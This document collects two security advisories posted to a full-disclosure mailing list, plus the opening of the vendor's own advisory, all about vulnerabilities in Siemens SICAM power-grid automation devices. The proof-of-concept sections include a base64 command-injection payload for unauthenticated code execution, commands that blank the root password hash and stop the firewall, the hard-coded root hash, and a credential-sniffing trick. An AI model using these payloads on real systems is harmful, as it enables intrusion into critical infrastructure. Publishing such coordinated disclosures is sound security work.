=== Content from seclists.org_ba95e680_20250111_131423.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20240626-0 :: Multiple Vulnerabilities in Siemens Power Automation Products

---

*From*: SEC Consult Vulnerability Lab via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Wed, 26 Jun 2024 09:01:43 +0000

---

```

SEC Consult Vulnerability Lab Security Advisory < 20240626-0 >
=======================================================================
              title: Multiple Vulnerabilities in Power Automation Products
            product: Siemens CP-8000/CP-8021/CP8-022/CP-8031/CP-8050/SICORE
 vulnerable version: CPC80 < V16.41 / CPCI85 < V5.30 / OPUPI0 < V5.30 / SICORE < V1.3.0 /
                     CPCX26 < V06.02 for CP-2016 and PCCX26 < V06.05 for CP-2019 in SICAM AK3 /
                     ETA4 < V10.46 and ETA5 < V03.27 for SM-2558 ins SICAM AK3, SICAM BC and SICAM TM
      fixed version: CPC80 V16.41 / CPCI85 V5.30 / OPUPI V5.30 / SICORE V1.3.0 / CPCX26 V06.02 /
                     PCCX26 V06.05 / ETA4 V10.46 / ETA5 V03.27
         CVE number: CVE-2024-31484, CVE-2024-31485, CVE-2024-31486
             impact: high
           homepage: <https://www.siemens.com/global/en/products/energy/energy-automation-and-smart-grid.html>
              found: 2023-04-03 and 2024-01-12
                 by: Stefan Viehboeck (Office Vienna)
                     Steffen Robertz (Office Vienna)
                     Gerhard Hechenberger (Office Vienna)
                     Constantin Schieber-Knoebl (Office Vienna)
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult, an Eviden business
                     Europe | Asia

                     <https://www.sec-consult.com>

=======================================================================

Vendor description:
-------------------
"We are a technology company focused on industry, infrastructure,
transport, and healthcare. From more resource-efficient factories,
resilient supply chains, and smarter buildings and grids, to cleaner
and more comfortable transportation as well as advanced healthcare,
we create technology with purpose adding real value for customers."

Source: <https://new.siemens.com/global/en/company/about.html>

Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.

Vulnerability overview/description:
-----------------------------------
1) Buffer Overread (Only CP-8000/CP-8021/CP-8022/CP-8031/CP-8050/CPCX26/PCCX26/ETA4/ETA5, CVE-2024-31484)
The webserver running on the CP-8050 and CP-8031 is vulnerable to a buffer overread
vulnerability.

The value of the HTTP header "Session-ID" is processed and used in a "strncpy" call
without proper termination. Thus, data structures from the BSS segment will be
leaked in the response. Attackers might be able to read sensitive data from memory.

2) Privilege Escalation (Only CP-8031/CP-8050 and SICORE devices, CVE-2024-31485)
An attacker with an account with the viewer (or higher) role can intercept unencrypted
traffic of other users of the web interface. Thus, the attacker can intercept higher
privileged user accounts and passwords and might gain access to their accounts to
perform tasks with elevated privileges.

3) Unsafe Storage of MQTT Client Passwords (Only CP-8031/CP-8050, CVE-2024-31486)
A PLC with the OPUPI0 MQTT application installed is able to connect to
an MQTT server. The configured MQTT password for the server is stored
in cleartext on the device and can be read by exploiting a potential
code execution or file disclosure vulnerability or with physical access
to the device.

Proof of concept:
-----------------
1) Buffer Overread (Only CP-8000/CP-8021/CP-8022/CP-8031/CP-8050/CPCX26/PCCX26/ETA4/ETA5, CVE-2024-31484)
The buffer overread can be triggered by sending a "Session-ID" in the HTTP request header
with exactly 20 bytes. This can be done with e.g. this request:

POST /SICAM_TOOLBOX_1703_remote_connection_00.htm HTTP/1.1
User-Agent: SICAM TOOLBOX II
Version: 1
Session-ID: 3814280BA9921c6cAAAA
Sequence-ID: 1
Content-Length: 8
Content-Type: text/plain
KeepAlive: 5
Connection: close
type=3

The server answers with following response:

HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA9921c6cAAAAæk¤
Cache-Control: max-age=0, private
X-Frame-Options: sameorigin
Strict-Transport-Security: max-age=31536000; includeSubdomains
Content-Security-Policy: default-src 'self' data: blob: 'unsafe-inline' 'unsafe-eval'
X-XSS-Protection: 1; mode=block
X-Permitted-Cross-Domain-Policies: none
Content-Length: 71
Connection: close
Date: Wed, 30 Mar 2022 01:38:37 GMT

Sequence-ID: 1
Content-Type: text/plain
Content-Length: 8

type=4

The Session-ID in the response leaks at least 4 additional bytes. Further,
the structure of the response is broken, as some HTTP headers are suddenly part
of the body.

The vulnerability most likely stems from a misuse of the strncpy function.
The following code segment was analyzed (RTUM85.elf, Offset 0x1d50de):

ptr_fcgi_header = get_fcgi_param(fcgi_struct, "HTTP_SESSION_ID);
if (ptr_fcgi_header == (char*) 0x00) goto LAB_001d4a66;
if ( is_a_session_available == 0 ) {
    strncpy(&session_id, ptr_fcgi_header, 0x14);
}

strncpy is called with a length parameter of 0x14. To trigger the vulnerability,
we are sending exactly 0x14 bytes. Thus, we believe that the global session_id
variable is never properly terminated with a Null-pointer.

libc's documentation even contains a warning for this case:
"If there is no null byte among the first n bytes of src, the string
placed in dest will not be null-terminated."

Thus, if the response is built, every data structure in BSS following the
session_id global will be printed as string until a Null byte is encountered.

2) Privilege Escalation (Only CP-8031/CP-8050 and SICORE devices, CVE-2024-31485)
An attacker with an account with the viewer (or higher) role can intercept unencrypted
traffic of other users of the web interface. Thus, the attacker can intercept higher
privileged user accounts and passwords.

By starting the Ethernet Packet Capture (Home -> Monitoring & Simulation -> Ethernet
Packet Capture), a request is sent. This request can be modified by an interceptor
proxy (e.g. Burp Suite).

POST /sicweb-ajax/rtum85/cview HTTP/1.1
Host: HOST
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/xml
SICWEB-SID: xNG1v825qFmCMo8hpjfISlVARKipW1B+lz9d5FoBxipR87VT
Content-Length: 198
Origin: http:// HOST
Connection: close
Referer: http:// HOST/

<?xml version="1.0" encoding="UTF-8"?>
<Cmd_SetCustomViewValue><view id="packet_capture"><parameter id="p0">
<value>lo</value>
</parameter></view></Cmd_SetCustomViewValue>

The attacker can then send the parameter id p0 to the value "lo" and start the
packet capture in order to dump from the loopback interface. It is a valid
interface, as it only consist of lowercase characters and numbers (fix
for CVE-2023-33919).

However, the webserver implements TLS in a stunnel fashion. It accepts all
TLS traffic on port 443, then decrypts it and forwards it via loopback interface
to port 80. By being able to read the loopback traffic, an attacker can now
see all communication, including passwords of higher privileged users.

3) Unsafe Storage of MQTT Passwords (Only CP-8031/CP-8050, CVE-2024-31486)
To demonstrate the issue, the following parameters were set for the MQTT client
using the Siemens Toolbox II:
* "8 MQTT password" mqtt_pw_sectest
* "9 MQTT username" mqtt_sectest

The password (together with the username) can be located in the
/ies/data/local/system/iescfg.iar file on the device, which can be
retrieved by shell access/code execution on the device or by desoldering
and reading its unencrypted flash memory chip:
-----------------------------------------------------------------------
grep -rain "mqtt_pw_sectest" /ies/data/local/system/iescfg.iar
[...]
mqtt
mqtt_sectest.
mqtt_pw_sectest.
< �MQTT_Broker
[...]
-----------------------------------------------------------------------

Vulnerable / tested versions:
-----------------------------
The following version has been tested which was the latest version available
at the time of the test:

Vulnerability 1 and 2 were confirmed on Siemens SICAM A8000 CP-8031 V05.12
Vulnerability 3 was confirmed on Siemens A8000 CP-8050 V04.92

Vendor contact timeline:
------------------------
2023-04-18: Contacting vendor through productcert () siemens com for vulnerability 3
2023-04-19: Advisory will be handled as case #92461.
2023-06-13: Siemens releases advisory for other vulnerabilities, see
<https://sec-consult.com/vulnerability-lab/advisory/multiple-vulnerabilities-siemens-a8000/>
2023-10-09: Requesting status update
2024-04-03: Requesting status update.
2024-04-04: Unsafe Storage of MQTT password: fix will be released in April 2024,
            Siemens advisory scheduled for May 2024
2024-04-11: Contacting vendor through productcert () siemens com for Vulnerability 1 and 2
2024-04-12: Siemens assigned case #68662 for Vulnerability 1,2
2024-05-14: Siemens publishes SSA-871704 for vulnerability 1,2,3
2024-06-11: Siemens publishes SSA-620338 for Vulnerability 1
2024-06-26: Public release of advisory

Solution:
---------
The vendor provides a patch which can be downloaded at the following URLs
depending on the affected device:

CPC80 Central Processing/Communication: The firmware CPC80 V16.41 is present within “CP-8000/CP-8021/CP-8022 Package”
V16.41
<https://support.industry.siemens.com/cs/ww/en/view/109812178/>

CPCI85 Central Processing/Communication: The firmware CPCI85 V5.30 is present within "CP-8031/CP-8050 Package" V5.30
<https://support.industry.siemens.com/cs/ww/en/view/109804985/>

SICORE Base system: The firmware SICORE V1.3.0 is present within "SICAM 8 Software Solution Package" V5.30
<https://support.industry.siemens.com/cs/ww/en/view/109818240/>

OPUPI0 AMQP/MQTT: The firmware OPUPI0 V5.30 is present within "CP-8031/CP-8050 Package" V5.30
<https://support.industry.siemens.com/cs/ww/en/view/109804985/>

CPCX26 Central Processing/Communication: The firmware CPCX26 V06.02 is present within “SICAM RTUs AK3 Package” V06.02
<https://support.industry.siemens.com/cs/ww/en/view/109813252/>

PCCX26 Ax 1703 PE, Contr, Communication Element: The firmware PCCX26 V06.05 is present within “SICAM RTUs AK3 Package”
V06.02
<https://support.industry.siemens.com/cs/ww/en/view/109813252/>

ETA4 Ethernet Interface IEC60870-5-104: The firmware ETA4 V10.46 is present within “SICAM RTUs AK3 Package” V06.02
<https://support.industry.siemens.com/cs/ww/en/view/109813252/>

ETA5 Ethernet Int. 1x100TX IEC61850 Ed.2: The firmware ETA5 V03.27 is present within “SICAM RTUs AK3 Package” V06.02
<https://support.industry.siemens.com/cs/ww/en/view/109813252/>

Additional information from the vendor can be found in their advisories:
<https://cert-portal.siemens.com/productcert/html/ssa-871704.html>
<https://cert-portal.siemens.com/productcert/html/ssa-620338.html>

Workaround:
-----------
Limit network and physical access to the PLC.

Advisory URL:
-------------
<https://sec-consult.com/vulnerability-lab/>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Eviden business
Europe | Asia

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
Eviden business. It ensures the continued knowledge gain of SEC Consult in the
field of network and application security to stay ahead of the attacker. The
SEC Consult Vulnerability Lab supports high-quality penetration testing and
the evaluation of new offensive and defensive technologies for our customers.
Hence our customers obtain the most current information about vulnerabilities
and valid recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <https://sec-consult.com/career/>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <https://sec-consult.com/contact/>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: security-research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <https://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

EOF Stefan Viehboeck, Steffen Robertz, Gerhard Hechenberger, Constantin Schieber-Knoebl  / @2024

```

**Attachment:
[smime.p7s](att-4/smime_p7s.bin)**

*Description:* S/MIME Cryptographic Signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

### Current thread:

* **SEC Consult SA-20240626-0 :: Multiple Vulnerabilities in Siemens Power Automation Products** *SEC Consult Vulnerability Lab via Fulldisclosure (Jul 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from seclists.org_4878acfe_20250111_131423.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](13)
[By Date](date.html#14)
[![Next](/images/right-icon-16x16.png)](15)

[![Previous](/images/left-icon-16x16.png)](13)
[By Thread](index.html#14)
[![Next](/images/right-icon-16x16.png)](15)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20230703-0 :: Multiple Vulnerabilities including Unauthenticated RCE in Siemens A8000

---

*From*: "SEC Consult Vulnerability Lab, Research via Fulldisclosure" <fulldisclosure () seclists org>

*Date*: Mon, 3 Jul 2023 06:44:28 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20230703-0 >
=======================================================================
               title: Multiple Vulnerabilities including Unauthenticated RCE
             product: Siemens A8000 CP-8050 MASTER MODULE (6MF2805-0AA00)
                      Siemens A8000 CP-8031 MASTER MODULE (6MF2803-1AA00)
  vulnerable version: <= V04.92
       fixed version: CPCI85 V05
          CVE number: CVE-2023-28489, CVE-2023-33919, CVE-2023-33920,
                      CVE-2023-33921
              impact: Critical
            homepage: <https://www.siemens.com>
               found: 2023-02-15
                  by: Stefan Viehböck (Office Vienna)
                      Christian Hager (Office Vienna)
                      Steffen Robertz (Office Vienna)
                      Gerhard Hechenberger (Office Vienna)
                      Gorazd Jank (Office Vienna)
                      Constantin Schieber-Knoebl (Office Vienna)
                      SEC Consult Vulnerability Lab

                      An integrated part of SEC Consult, an Eviden business
                      Europe | Asia

                      <https://www.sec-consult.com>

=======================================================================

Vendor description:
-------------------
"We are a technology company focused on industry, infrastructure,
transport, and healthcare. From more resource-efficient factories,
resilient supply chains, and smarter buildings and grids, to cleaner
and more comfortable transportation as well as advanced healthcare,
we create technology with purpose adding real value for customers."

Source: <https://new.siemens.com/global/en/company/about.html>

Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.
Customers should update to CPCI85 V05 or later version.
(<https://support.industry.siemens.com/cs/ww/en/view/109804985/>)

SEC Consult highly recommends to perform a thorough security review of
the product conducted by security professionals to identify and resolve
potential further security issues.

Vulnerability overview/description:
-----------------------------------
1) Unauthenticated Remote Code Execution (CVE-2023-28489)
By sending an HTTP request with a crafted header to port 80/443 of
the PLC, arbitrary commands can be executed as system user. The port
is used to configure and control Siemens PLCs with the Siemens
Toolbox II application and is typically accessible on such devices.

2) Authenticated Command Injection (CVE-2023-33919)
Due to missing server-side input sanitation, any user with access to
the SICAM WEB interface can execute arbitrary commands as user "root"
on the device. This works by setting malicious parameters and starting
an Ethernet package capture.

3) Hard-coded Root Password (CVE-2023-33920)
The PLC contains a hard-coded "root" user password hash. This
password hash is the same on all devices. If the corresponding
password is known, it could be used to login via UART and SSH.

4) Console Login via UART (CVE-2023-33921)
The UART interface can be accessed with physical access to the PCB.
After connecting to the interface, boot information is given and a
login prompt is provided. Login as "root" user is possible after
changing the hard-coded "root" password hash (see 1,2, and 3).

Proof of concept:
-----------------
1) Unauthenticated Remote Code Execution (CVE-2023-28489)
To exploit this vulnerability, an HTTP request including the command
must be crafted. No "/" characters can be used, therefore commands
are encoded as base64, e.g., "id" as "aWQ=". The command must be
provided as UPLOADFILENAME header. A full command looks as follows:

;echo aWQ=| base64 -d | sh #

The following header format must be obeyed:
* User-Agent: SICAM TOOLBOX II
* Session-ID: [ARBITRARY 16 CHARACTERS]
* UPLOADFILENAME: [COMMAND]

Additionally, the request body must contain the following POST parameters:
* type=20
* length=[ARBITRARY]
* data=[ARBITRARY]

A valid request can be seen below:
-----------------------------------------------------------------------
[ POC request removed ]
-----------------------------------------------------------------------

If it worked, the response body will be "type=21". Additionally, the
output on the UART interface indicates code execution as root user:
-----------------------------------------------------------------------
base64: /ies/IN/_: No such file or directory
uid=0(root) gid=0(root)
-----------------------------------------------------------------------

Subsequently, the SSH port can be opened by sending the following
commands separately and encoded as base64 string. They will replace
the set default root password hash with an empty password hash,
reconfigure the Dropbear SSH daemon and stop the firewall:
-----------------------------------------------------------------------
sed -i
s'/:$6$jNY7stPOMCNi$bMqOCQX0ClFK3PyNPUyDvuF2xKOJ8j00v79.wXGV0BG7cxKc8aCo\/FWtDljQjCbm6JnZqxiMg
re5P14Kv2zAH1:/:32BZgrJ3XBMoY:/' /etc/shadow
sed -i s'/"$DROPBEAR_ARGS -R -s -g"/"$DROPBEAR_ARGS -R"/' /etc/init.d/dropbear
/etc/init.d/dropbear restart
/etc/init.d/rc.firewall stop
-----------------------------------------------------------------------

After this, login via SSH as root is possible:
-----------------------------------------------------------------------
ssh root@[IP]
root@[IP]'s password:
~# id
uid=0(root) gid=0(root) groups=0(root),10(wheel)
~#
-----------------------------------------------------------------------

2) Authenticated Command Injection (CVE-2023-33919)
To trigger the command injection vulnerability, the payload must be set in
the "LAN port group" field on the SICAM WEB page "Monitoring & Simulation"
-> "Ethernet Packet Capture" section "Capture configuration"
(other fields may also be affected).
As the web interface only provides a drop-down menu, the payload must
be set by manipulating the JavaScript logic or by directly manipulating
the HTTP request as below, where "ping [IP]\nBBBBBBB" was set:

-----------------------------------------------------------------------
POST /sicweb-ajax/rtum85/cview HTTP/1.1
Host: [HOST]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/xml
SICWEB-SID: xNG1v825qFmCMo8hpjfISlVARKipW1B+lz9d5FoBxipR87VT
Content-Length: 198
Origin: http://[HOST]
Connection: close
Referer: http://[HOST]/

<?xml version="1.0" encoding="UTF-8"?>
<Cmd_SetCustomViewValue><view id="packet_capture"><parameter id="p0">
<value>
ping [IP]
BBBBBBB</value>
</parameter></view></Cmd_SetCustomViewValue>
-----------------------------------------------------------------------

The line break in the payload is especially important, as the command is
executed as part of a shell script.
This script is generated and executed by pressing the "Start/Stop trace"
button in the "Capture Controlling" section and saved as
/tmp/incws_tcpdump.sh. An excerpt with the injected command is shown
below:

-----------------------------------------------------------------------
[...] # lets start tcpdump
tcpdump -i
ping [IP] BBBBBBB '(ether host 00:11:11:33:44:00) and (host 1.1.1.2 or host 2.2.2.34) and (port 999)' -C 1 -W 4 -U -w
/var/log/wireshark.pcap &
[...]
-----------------------------------------------------------------------

The executed script creates a process running as root user, which can
be seen by running "ps" on the device:

-----------------------------------------------------------------------
root        1100  0.0  0.1   1784  1168 ?        S    Feb21   0:00 /bin/sh /etc/init.d/rc.sysinit
root        1149  0.1  0.3  11768  1748 ?        S1   Feb21   6:03  \_ /ies/apps/system/bin/ISV00.elf
/ies/apps/sys_desc/target_rc.json
[...]
www-data    1487  0.0  0.6   7568  3444 ?        S    Feb21   0:40      \_ /usr/sbin/lighttpd -Df
/etc/lighttpd/lighttpd.conf
root       10655  0.0  0.2   1880  1344 ?        S    04:55   0:00      \_ /bin/sh /tmp/incws_tcpdump.sh
root       10667  0.0  0.2   1884  1360 ?        S    04:57   0:00          \_ ping [IP]
-----------------------------------------------------------------------

3) Hard-coded Root Password (CVE-2023-33920)
A hard-coded "root" user password hash can be found in the /etc/shadow
file:
-----------------------------------------------------------------------
root:$6$jNY7stPOMCNi$bMqOCQX0ClFK3PyNPUyDvuF2xKOJ8j00v79.wXGV0BG7cxKc8aCo/FWtDljQjCbm6JnZqxiMg
re5P14Kv2zAH1:16436:0:99999:7:::
-----------------------------------------------------------------------

4) Console Login via UART (CVE-2023-33921)
The serial console (UART) can be accessed on the backside of the PCB
on two Vias. After removing an additional logic IC, receiving data and
sending data is possible with the following UART settings:
* Voltage: 3.3V
* Speed: 115200 Baud
* Symbol-ratio: 8 Data Bits 1 Stop Bit (8N1)
Extensive boot log output can be received. Some output is shown below:
-----------------------------------------------------------------------
U-Boot SPL 2013.01.01 (Jan 16 2020 - 12:56:02)
BOARD : Altera SOCFPGA Cyclone V Board
CLOCK: EOSC1 clock 50000 KHz
[...]
Starting IES system
-----------------------------------
Welcome to SICAM IES
-----------------------------------

Welcome to
      _______. __    ______     ___      .___  ___.
     /       ||  |  /      |   /   \     |   \/   |
    |   (----`|  | |  ,----'  /  ^  \    |  \  /  |
     \   \    |  | |  |      /  /_\  \   |  |\/|  |
.----)   |   |  | |  `----./  _____  \  |  |  |  |
|_______/    |__|  \______/__/     \__\ |__|  |__| RTUs

[...]
sicam login:
-----------------------------------------------------------------------

Additionally, a console login form is displayed. Login is possible if
the password for the set "root" user password hash (see 3) is known.

Vulnerable / tested versions:
-----------------------------
The following product has been tested:
* Siemens A8000 CP-8050 04.92
* Siemens A8000 CP-8031 04.92

Vendor contact timeline:
------------------------
2023-03-14: Contacting vendor through productcert () siemens com, sending
             encrypted advisory
2023-03-29: Naming researchers involved
2023-03-31: Requesting state. Vulnerability 1 will be published first
             due to criticality. Rest will follow.
2023-04-11: Siemens releases advisory for unauthenticated RCE
             (Vulnerability 1, CVE-2023-28489)
2023-06-13: Siemens releases advisory for vulnerability 2, 3 and 4
             (CVE-2023-33919, CVE-2023-33920, CVE-2023-33921)
2023-06-21: Siemens has additional feedback regarding the contents of the
             advisory.
2023-07-03: Release of security advisory.

Solution:
---------
Update to firmware CPCI85 V05 or later version, see vendor advisory
for further information:
<https://cert-portal.siemens.com/productcert/html/ssa-472454.html>
<https://cert-portal.siemens.com/productcert/html/ssa-731916.html>

Workaround:
-----------
Restrict network access to the A8000 CP-8050/CP8031 module or disable the
Toolbox II communication on port 80/443. Make sure to strictly limit
physical access to the PLC during and also after its life cycle.

Advisory URL:
-------------
<https://sec-consult.com/vulnerability-lab/>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Eviden business
Europe | Asia

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
Eviden business. It ensures the continued knowledge gain of SEC Consult in the
field of network and application security to stay ahead of the attacker. The
SEC Consult Vulnerability Lab supports high-quality penetration testing and
the evaluation of new offensive and defensive technologies for our customers.
Hence our customers obtain the most current information about vulnerabilities
and valid recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <https://sec-consult.com/career/>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <https://sec-consult.com/contact/>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: security-research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <http://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

EOF Stefan Viehböck, Christian Hager, Steffen Robertz, Gerhard Hechenberger,
Gorazd Jank, Constantin Schieber-Knoebl / @2023
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](13)
[By Date](date.html#14)
[![Next](/images/right-icon-16x16.png)](15)

[![Previous](/images/left-icon-16x16.png)](13)
[By Thread](index.html#14)
[![Next](/images/right-icon-16x16.png)](15)

### Current thread:

* **SEC Consult SA-20230703-0 :: Multiple Vulnerabilities including Unauthenticated RCE in Siemens A8000** *SEC Consult Vulnerability Lab, Research via Fulldisclosure (Jul 07)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from cert-portal.siemens.com_a8932065_20250111_131424.html ===
Siemens Security Advisory by Siemens ProductCERT

SSA-731916: Multiple Vulnerabilities in CPCI85 Firmware of SICAM
A8000 Devices

Publication Date:
Last Update:
Current Version:
CVSS v3.1 Base Score: 7.2

2023-06-13
2023-06-13
V1.0

SUMMARY

The CPCI85 ﬁrmware of SICAM A8000 CP-8031 and CP-8050 is affected by multiple vulnerabilities
such as authenticated remote command injection, exposure of serial UART interface, and hard coded
credentials (for UART login).

Siemens has released updates for the affected products and recommends to update to the latest versions.

AFFECTED PRODUCTS AND SOLUTION

Affected Product and Versions

Remediation

CP-8031 MASTER MODULE (6MF2803-
1AA00):
All versions < CPCI85 V05

Update to CPCI85 V05 or later version
https://support.industry.siemens.com/cs/ww/en/
view/109804985/

CP-8050 MASTER MODULE (6MF2805-
0AA00):
All versions < CPCI85 V05

Update to CPCI85 V05 or later version
https://support.industry.siemens.com/cs/ww/en/
view/109804985/

WORKAROUNDS AND MITIGATIONS

Product-speciﬁc remediations or mitigations can be found in the section Affected Products and Solution.
Please follow the General Security Recommendations.

GENERAL SECURITY RECOMMENDATIONS

Operators of critical power systems (e.g. TSOs or DSOs) worldwide are usually required by regulations
to build resilience into the power grids by applying multi-level redundant secondary protection schemes.
It is therefore recommended that the operators check whether appropriate resilient protection measures
are in place. The risk of cyber incidents impacting the grid’s reliability can thus be minimized by virtue
of the grid design. Siemens strongly recommends applying the provided security updates using the
corresponding tooling and documented procedures made available with the product. If supported by
the product, an automated means to apply the security updates across multiple product instances may
be used. Siemens strongly recommends prior validation of any security update before being applied,
and supervision by trained staff of the update process in the target environment. As a general security
measure Siemens strongly recommends to protect network access with appropriate mechanisms (e.g.
ﬁrewalls, segmentation, VPN). It is advised to conﬁgure the environment according to our operational
guidelines in order to run the devices in a protected IT environment.

Recommended security guidelines can be found at: https://www.siemens.com/gridsecurity

SSA-731916

© Siemens 2023

Page 1 of 3

Siemens Security Advisory by Siemens ProductCERT

PRODUCT DESCRIPTION

